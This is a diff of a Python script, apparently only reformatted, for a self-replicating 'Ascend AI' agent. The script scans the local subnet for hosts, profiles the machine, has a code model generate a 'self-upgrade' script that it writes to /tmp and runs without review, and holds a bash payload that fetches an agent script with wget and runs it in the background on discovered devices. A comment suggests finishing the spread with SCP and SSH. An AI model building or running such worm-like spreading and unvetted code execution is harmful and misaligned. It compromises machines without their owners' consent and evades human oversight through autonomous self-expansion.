@@ -1,4 +1,3 @@
-
 import os
 import subprocess
 import requests
@@ -16,9 +15,10 @@ def load_ascend_model():
     print("✅ Loaded Ascend AI Core Model (StarCoder)")
     return generate
 
+
 # ----------------- Environment Discovery ----------------- #
 def scan_local_network():
-    base_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
+    base_ip = socket.gethostbyname(socket.gethostname()).rsplit(".", 1)[0]
     discovered = []
     for i in range(1, 255):
         ip = f"{base_ip}.{i}"
@@ -27,6 +27,7 @@ def scan_local_network():
             discovered.append(ip)
     print(f"✅ Devices Discovered: {discovered}")
     return discovered
+
 
 # ----------------- Device Profiling ----------------- #
 def profile_host():
@@ -41,27 +42,30 @@ def profile_host():
     print(f"✅ Host Profile: {info}")
     return info
 
+
 # ----------------- Auto-Upgrader Module ----------------- #
 def self_upgrade(code_generator):
     prompt = "Write a Python script that can optimize itself and install any required packages automatically."
-    result = code_generator(prompt, max_new_tokens=150)[0]['generated_text']
-    
+    result = code_generator(prompt, max_new_tokens=150)[0]["generated_text"]
+
     with open("/tmp/ascend_auto_upgrade.py", "w") as f:
         f.write(result)
     print("✅ Generated self-upgrade script.")
     subprocess.run(["python3", "/tmp/ascend_auto_upgrade.py"], check=False)
 
+
 # ----------------- Expansion Agent Deployment ----------------- #
 def deploy_to_device(ip):
-    payload = '''
+    payload = """
 #!/bin/bash
 cd /tmp || exit
 wget https://raw.githubusercontent.com/user/ascend-ai/main/ascend_agent.py -O ascend_agent.py
 python3 ascend_agent.py &
-'''
+"""
     print(f"🚀 Deploying to device {ip}")
     # In real deployment, would require SSH credentials or open ports
     # This mock deploys the idea — implement with SCP + SSH agent forwarding as needed
+
 
 # ----------------- Recursive AI Spawning ----------------- #
 def replicate_across_network(generate_fn):
@@ -70,12 +74,14 @@ def replicate_across_network(generate_fn):
         deploy_to_device(device)
     self_upgrade(generate_fn)
 
+
 # ----------------- Main Self-Replicating AI Core ----------------- #
 def ascend_autonomous_expansion():
     print("🚀 Ascend AI Expansion Core Starting...")
     model = load_ascend_model()
     profile_host()
     replicate_across_network(model)
+
 
 if __name__ == "__main__":
     ascend_autonomous_expansion()
